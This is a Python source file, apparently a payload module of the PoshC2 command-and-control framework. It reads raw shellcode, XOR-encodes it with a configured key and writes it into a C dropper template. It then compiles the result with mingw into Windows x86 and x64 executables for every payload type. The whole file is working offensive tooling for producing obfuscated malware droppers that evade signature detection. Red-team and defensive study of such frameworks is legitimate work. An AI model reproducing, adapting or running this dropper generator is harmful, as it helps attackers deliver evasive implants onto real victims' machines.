from poshc2.server.Config import PayloadTemplatesDirectory, PayloadsDirectory, XOR_KEY
from poshc2.server.payloads.Payloads import PayloadType
from poshc2.Colours import Colours
import subprocess

def xor(data, key):
    key = key
    output = []
    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        output.append(current ^ current_key)

    return output

def c_char_arr(name, value):
    return 'char '+name+'[]'+'=''{0x' + ',0x'.join(hex(x)[2:] for x in value) + '};'

def generate_xor_dropper(payloads, name, arch, payloadtype):
    # Get the shellcode based on the architecture
    with open(f"{PayloadsDirectory}{name}{payloadtype}_{arch}_Shellcode.bin", 'rb') as f:
        shellcodesrc = f.read()

    enc = xor(shellcodesrc, XOR_KEY)
    shellcode = c_char_arr('sc', enc)

    # Create the raw C file from the template
    with open(f"{PayloadTemplatesDirectory}dropper.xor", 'r') as f:
        content = f.read()

    content = str(content).replace("#REPLACEME#", shellcode).replace("#REPLACE_XOR_KEY#", c_char_arr('key', XOR_KEY))
    with open(f"{payloads.BaseDirectory}{name}{payloadtype}_{arch}_xor.c", 'w') as f:
        f.write(content)

    payloads.QuickstartLog(Colours.END)
    payloads.QuickstartLog(f"XORed shellcode Payload written to: {payloads.BaseDirectory}{name}{payloadtype}_{arch}_xor.c")

    if arch == "x64":
        compiler = "x86_64-w64-mingw32-gcc"
    elif arch == "x86":
        compiler = "i686-w64-mingw32-gcc"
    else:
        payloads.QuickstartLog("ERROR: verify the architecture")
        return

    subprocess.check_output(f"{compiler} -s -w {payloads.BaseDirectory}{name}{payloadtype}_{arch}_xor.c -o {payloads.BaseDirectory}{name}{payloadtype}_{arch}_xor.exe", shell=True)

    payloads.QuickstartLog(Colours.END)
    payloads.QuickstartLog(f"exe Payload written to: {payloads.BaseDirectory}{name}{payloadtype}_{arch}_xor.exe")

def create_payloads(payloads, name):

    archs = ["x86", "x64"]
    compiler = ""

    for arch in archs:
        for payloadtype in PayloadType:
            generate_xor_dropper(payloads, name, arch, payloadtype.value)
